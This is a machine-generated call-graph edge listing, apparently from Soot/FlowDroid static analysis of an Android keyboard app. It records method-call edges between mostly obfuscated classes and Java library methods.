SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r0.<lte: void <init>()>() in <ltf: void <clinit>()> ==> <lte: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r2) in <lwf: void <clinit>()> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_THUMBNAIL", 7, 7) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
CLINIT edge: staticinvoke <dwx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dwx: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Object clone()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <lsh: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lme: lma d(java.lang.Object)> ==> <lqq: java.lang.Object get(java.lang.Object)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_UserUnlocked", $r2) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r8.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r0.<lqc: void <init>()>() in <lqc: void <clinit>()> ==> <lqc: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r8, $r3) in <lqs: boolean containsAll(java.util.Collection)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljf: void j(int,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "baseCount") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <coo: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r3 = staticinvoke <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>($r5, $r2) in <lmb: lme f()> ==> <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/LatinApp") in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("stack_size", class "Lltc;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>($r3, r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
SPECIAL edge: specialinvoke r0.<ivv: void <init>()>() in <ivv: void <init>(byte[])> ==> <ivv: void <init>()>
SPECIAL edge: specialinvoke $r17.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_AUTOCOMPLETE", 17, 17) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <ltr: int b()>
STATIC edge: $i0 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkt: void e(int)> ==> <lkg: int a(int,int)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(7) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int size()>() in <ljd: boolean isEmpty()> ==> <ljd: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<qj: int b(java.lang.Object)>($r2) in <qj: java.lang.Object get(java.lang.Object)> ==> <qj: int b(java.lang.Object)>
SPECIAL edge: $r4 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lsz: java.lang.Object d(java.lang.Object)>($r3) in <lsm: java.lang.Object d(lsz)> ==> <lsz: java.lang.Object d(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<lmo: boolean containsAll(java.util.Collection)>($r10) in <lqs: boolean containsAll(java.util.Collection)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke r0.<lkg: void g(int)>($i0) in <lkg: void c(java.lang.Object)> ==> <lkg: void g(int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(18) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean z(java.lang.String)> ==> <java.lang.String: int length()>
CLINIT edge: staticinvoke <lkh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkh: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<ljd: int d(int)>($i0) in <liz: java.lang.Object next()> ==> <ljd: int d(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(3) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $r7 = interfaceinvoke $r3.<java.util.Map: java.util.Set entrySet()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lig: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r1, null) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i1, $i0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lqr: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ac(int)>($i0) in <lly: void j(java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <lly: lma g()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<ltc: void <init>(java.lang.String,int,int)>("MEDIUM", 1, 20) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("CuratedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete privateUse subtag, error index: ") in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(58) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<her: void <init>(miy)>($r0) in <her: her k(miy)> ==> <her: void <init>(miy)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("identifier must not be empty") in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <androidx.core.content.FileProvider: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <androidx.core.content.FileProvider: void <clinit>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r0 = staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Runtime: java.lang.Runtime getRuntime()>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lth: void <init>(lto)>($r1) in <lth: lth i(java.lang.String)> ==> <lth: void <init>(lto)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(7) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r13, $r11) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: void q(lsz,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
SPECIAL edge: specialinvoke $r0.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_SEARCH_FEATURE", 0, 0) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(12) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r3 = virtualinvoke $r30.<java.lang.StringBuilder: java.lang.String toString()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]: ") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagFactory") in <hbu: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.Error: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(15) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsc: lsw a(java.util.logging.Level)>($r2) in <lsc: lsw d()> ==> <lsh: lsw a(java.util.logging.Level)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(11) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<lma: lsa l()>() in <llg: void <init>(llo)> ==> <lqn: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_count", class "Ljava/lang/Integer;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jlu: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>(0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lka: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int j()>() in <qj: int b(java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(18) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $i2 = staticinvoke <lma: int e(int)>($i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
INTERFACE edge: $z0 = interfaceinvoke $r3.<java.util.List: boolean isEmpty()>() in <ivv: ivw a()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(char,char)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: lma g()> ==> <lma: int e(int)>
STATIC edge: $r0 = staticinvoke <iye: lfa p(lfa)>($r1) in <hfd: void <clinit>()> ==> <iye: lfa p(lfa)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: boolean m()>
SPECIAL edge: specialinvoke $r13.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r8, $i0) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>()> ==> <lkf: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <iec: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object k(int)>($i0) in <ljb: java.lang.Object getValue()> ==> <ljd: java.lang.Object k(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.p: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jhe: void <init>(lak,lsr,int,byte[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lwe: void <init>()>() in <lwa: void <init>()> ==> <lwe: void <init>()>
STATIC edge: $i8 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String b()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Set: java.lang.Object[] toArray()>() in <ljf: java.lang.Object[] toArray()> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<qj: java.lang.Object get(java.lang.Object)>($r0) in <ivw: ivw g(java.lang.String)> ==> <qj: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.Set: java.util.Iterator iterator()>() in <lri: int b(java.util.Set)> ==> <lqs: java.util.Iterator iterator()>
STATIC edge: $i1 = staticinvoke <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>($r2, $r1, 3) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>
SPECIAL edge: specialinvoke $r13.<lvq: void <init>(lvr,int)>(r0, $i1) in <lvr: void <init>(lvr,lvr)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i8 = staticinvoke <izw: int ac(int)>($i6) in <lma: lma i(int,java.lang.Object[])> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Missing subtags to form a valid language tag") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
